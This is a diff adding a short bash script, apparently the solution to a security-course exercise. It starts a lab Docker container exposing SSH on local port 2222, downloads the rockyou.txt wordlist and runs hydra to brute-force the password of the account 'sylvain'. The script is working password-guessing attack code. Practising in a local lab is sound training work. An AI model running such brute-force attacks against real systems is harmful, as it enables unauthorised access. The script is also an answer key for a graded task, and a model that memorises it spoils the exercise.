@@ -1,0 +1,37 @@
+#!/bin/bash
+# This script uses hydra to brute force the SSH account sylvain on the Docker container
+
+# Check if docker is installed
+if ! command -v docker &> /dev/null
+then
+    echo "docker is not installed. Please install it first."
+    exit 1
+fi
+
+# Check if hydra is installed
+if ! command -v hydra &> /dev/null
+then
+    echo "hydra is not installed. Please install it first."
+    exit 2
+fi
+
+# Pull and run the Docker image sylvainkalache/264-1
+docker pull sylvainkalache/264-1
+docker run -p 2222:22 -d -ti sylvainkalache/264-1
+
+# Find a password dictionary
+# You can use any wordlist you want, but here is an example of using the rockyou.txt wordlist
+# You can download it from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+# Or you can use wget to download it directly
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# Use hydra to brute force the SSH account
+# The username is sylvain and the password is 11 characters long
+# The IP address is 127.0.0.1 and the port is 2222
+# You can adjust the number of threads (-t) and the timeout (-w) according to your needs
+hydra -l sylvain -P rockyou.txt -t 4 -w 30 127.0.0.1 -s 2222 ssh
+
+# If hydra finds the password, it will display it on the terminal
+# You can also save the output to a file using the -o option
+# For example: hydra -l sylvain -P rockyou.txt -t 4 -w 30 -o output.txt 127.0.0.1 -s 2222 ssh
+# Then you can share the password in your answer file
